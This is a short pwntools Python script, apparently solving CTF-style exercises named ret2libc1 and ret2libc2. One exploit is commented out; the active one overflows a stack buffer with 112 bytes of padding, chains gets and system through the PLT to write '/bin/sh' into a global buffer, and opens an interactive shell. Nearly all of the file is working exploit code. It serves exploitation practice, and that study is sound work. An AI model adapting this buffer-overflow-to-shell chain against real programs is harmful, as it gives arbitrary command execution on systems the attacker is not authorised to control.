from pwn import *


# ret2libc1
# addr_system_plt = 0x08048460
# addr_bin_sh = 0x08048720
# elf = ELF("./ret2libc1")
# addr_system_plt = elf.plt["system"]
# addr_bin_sh = next(elf.search(b"/bin/sh"))

# pwn_obj = process("./ret2libc1")
# pwn_obj.sendline(
#     b"#" * 112 + 
#     p32(addr_system_plt) + 
#     b"#" * 4 + 
#     p32(addr_bin_sh))
# pwn_obj.interactive()


# ret2libc2
elf = ELF("./ret2libc2")
addr_system_plt = elf.plt["system"]
addr_gets_plt = elf.plt["gets"]
addr_buf2 = elf.symbols["buf2"]

pwn_obj = process("./ret2libc2")
pwn_obj.sendline(
    b"#" * 112 + 
    p32(addr_gets_plt) + 
    p32(addr_system_plt) + 
    p32(addr_buf2) + 
    p32(addr_buf2))
pwn_obj.sendline(b"/bin/sh")
pwn_obj.interactive()
